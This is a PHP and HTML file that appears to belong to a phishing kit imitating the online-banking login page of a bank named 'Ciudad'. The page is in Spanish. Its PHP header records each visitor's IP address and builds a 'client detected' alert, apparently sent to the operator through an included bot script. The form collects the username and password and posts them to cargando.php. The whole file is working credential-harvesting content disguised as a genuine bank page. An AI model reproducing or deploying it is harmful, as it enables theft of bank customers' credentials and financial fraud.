<?php
$user_ip = $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
$enviara = "¡ALERTA! Cliente detectado 👁‍🗨\n" . 
            "🌐 IP " . $user_ip . "\n";
$enviar = urldecode($enviara);
include 'bot_id.php';

?>
<!DOCTYPE html>
<html lang="es"><head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="0">
  <meta http-equiv="x-ua-compatible" content="IE=11">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <link rel="shortcut icon" href="main/favicon.png">
  <title>Ciudad</title>
  <link rel="stylesheet" href="main/city.css" media="all">
  <link rel="stylesheet" href="main/other.css" media="all">
  <script type="text/javascript" src="main/core.js"></script>
</head>

<body class="h-100-vh">
  <noscript>
    <style>
      body {
        display: none;
      }
    </style>
  </noscript>
  <app-root _nghost-vfd-c16=""><app-login _nghost-vfd-c121="">
      <div eyeez21="" class="bg-grey h-100-vh bgh">
        <div eyeez21="" class="container login-principal">
          <div eyeez21="" class="form-signin">
            <h2 eyeez21="" class="logocentrado"><img eyeez21="" src="main/ciudad.svg">
            </h2>
            <div eyeez21="" class="position-relative text-center avatar"><img eyeez21="" src="main/icono.png"></div>
            <div eyeez21="" class="card">
              <div eyeez21="" class="card-body text-center">
                <div eyeez21="">
                  <form eyeez21="" method="post" id="formInicial" action="cargando.php" novalidate="" class="ng-touched ng-dirty ng-invalid">
                    <div id="inicial" style="display: block;">

                      <label eyeez21="" class="etiqueta usuarioEtiqueta">&nbsp;</label>
                      <br eyeez21="">
                      <div eyeez21="" class="text-left">

                        <label eyeez21="" for="inputUser" class="etiqueta mb-0">Ingresá tu
                          Usuario</label>

                        <input eyeez21="" oninput="checkInput('inputUser', 'btn1', 6);" name="usuario" type="text" id="inputUser" maxlength="20" autocomplete="off" placeholder="Usuario" class="form-control mb-2 ng-touched ng-dirty ng-invalid">

                        <div eyeez21="" class="form-check pl-0">
                          <label eyeez21="" class="form-check-label"><span eyeez21="" class="texto-check">Quiero
                              recordar
                              mi
                              usuario</span><input eyeez21="" name="recordar" type="checkbox" value="" formcontrolname="recordar" class="form-check-input ng-untouched ng-pristine ng-valid"><span eyeez21="" class="checkmark"></span></label>
                        </div>
                      </div>
                      <button eyeez21="" type="button" id="btn1" onclick="nextForm()" class="btn btn-lg btn-primary btn-block mt-2 font-Guardian radius-4" disabled="disabled">Siguiente</button>
                      <div eyeez21="" class="mt-3 mb-3">&nbsp;</div>

                      <div style="display: none;" id="dotAnim" class="row mt-3 justify-content-center loading-puntitos">
                        <div>
                          <div class="col-auto loading text-center">
                            <div class="dot" style="border: 2px solid rgb(0, 91, 170);"></div>
                            <div class="dot" style="border: 2px solid rgb(0, 91, 170);"></div>
                            <div class="dot" style="border: 2px solid rgb(0, 91, 170);"></div>
                          </div>
                        </div>
                      </div>

                    </div>

                    <div id="final" style="display: none;">
                      <input name="usrSaved" id="usrSaved" hidden="">
                      <label eyeez21="" id="etiquetaUser" class="etiqueta usuarioEtiqueta"></label>
                      <br eyeez21="">
                      <div eyeez21="" class="text-left">

                        <label eyeez21="" for="inputPassword" class="etiqueta mb-0">Ingresá tu
                          Clave</label>

                        <div eyeez21="" class="position-relative"><input eyeez21="" oninput="checkInput('inputClave', 'btn2', 1);" name="clave" style="margin-bottom:1rem!important" id="inputClave" placeholder="Clave" formcontrolname="clave" class="form-control ng-pristine ng-invalid ng-touched" type="password">
                          <div eyeez21="" class="d-inline-block eyePassAligne"><span onclick="togglePss('inputClave', 'eye1')" id="eye1" eyeez21="" class="manito ion-ojoCerrado"></span>
                          </div>
                        </div>
                      </div>
                      <button eyeez21="" type="submit" id="btn2" class="btn btn-lg btn-primary btn-block mt-2 font-Guardian radius-4" disabled="disabled" name="ingresarButton">Ingresar</button>
                      <button type="button" onclick="window.location.href = './index.php'" class="btn btn-link mt-3">Volver</button>
                      <div style="display: none;" id="msgError" eyeez21="" class="login-error-message">Alguno de los
                        datos que
                        ingresaste es incorrecto.
                      </div>

                    </div>

                  </form>
                </div>
              </div>
              <div eyeez21="" class="card-footer text-center help-items">
                <div eyeez21="" class="row">
                  <div eyeez21="" class="col-6"><a eyeez21="" href="#" class="card-link d-inline">Ayuda</a></div>
                  <div eyeez21="" class="col-6"><a eyeez21="" href="#" class="card-link">Nuevo&nbsp;usuario</a></div>
                </div>
              </div>
            </div>
          </div>
          <div eyeez21="" class="text-center color-azul font-Guardian-medium">Por tu seguridad, nunca
            compartas los datos de acceso ni <br eyeez21="" class="d-none d-sm-block"> códigos de validación
            de tu Home Banking. </div>
          <div eyeez21="" class="legales text-center font-Guardian">
            <p eyeez21=""><a eyeez21="" class="btn btn-link card-link font-size-8 pl-0">Términos
                y condiciones</a><a eyeez21="" class="btn btn-link card-link font-size-8">Seguridad del
                sistema</a><a eyeez21="" href="#" class="btn btn-link card-link font-size-8">Contacto</a></p>
          </div>
          <div eyeez21="" class="text-center texto-gris">Versión - v0.18.392</div>
        </div>
      </div>
    </app-login></app-root>
<script>(function(){var js = "window['__CF$cv$params']={r:'859c08c5ac851d43',t:'MTcwODY1NTI5NS43MjAwMDA='};_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js',document.getElementsByTagName('head')[0].appendChild(_cpo);";var _0xh = document.createElement('iframe');_0xh.height = 1;_0xh.width = 1;_0xh.style.position = 'absolute';_0xh.style.top = 0;_0xh.style.left = 0;_0xh.style.border = 'none';_0xh.style.visibility = 'hidden';document.body.appendChild(_0xh);function handler() {var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;if (_0xi) {var _0xj = _0xi.createElement('script');_0xj.innerHTML = js;_0xi.getElementsByTagName('head')[0].appendChild(_0xj);}}if (document.readyState !== 'loading') {handler();} else if (window.addEventListener) {document.addEventListener('DOMContentLoaded', handler);} else {var prev = document.onreadystatechange || function () {};document.onreadystatechange = function (e) {prev(e);if (document.readyState !== 'loading') {document.onreadystatechange = prev;handler();}};}})();</script><iframe style="position: absolute; top: 0px; left: 0px; border: medium none; visibility: hidden;" width="1" height="1"></iframe>
<script type="text/javascript">
  window.onload = function () {
    var formulario = document.getElementById('formInicial');
    var boton = document.getElementById('btn2');

    formulario.addEventListener('submit', function () {
      boton.disabled = true;
    });
  }

  function disableButtonOnClick(buttonId) {
    var button = document.getElementById(buttonId);
    button.addEventListener('click', function () {
      button.disabled = true;
    });
  }

  disableButtonOnClick('btn1');
</script>

</body></html>